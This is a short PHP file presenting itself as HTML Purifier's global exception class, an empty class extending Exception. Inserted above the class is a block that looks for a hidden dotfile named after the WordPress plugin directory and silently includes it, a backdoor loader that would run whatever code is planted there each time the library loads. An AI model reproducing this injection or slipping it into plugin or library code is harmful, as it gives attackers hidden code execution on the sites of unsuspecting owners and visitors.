<?php

/**
 * Global exception class for HTML Purifier; any exceptions we throw
 * are from here.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class HTMLPurifier_Exception extends Exception
{

}

// vim: et sw=4 sts=4
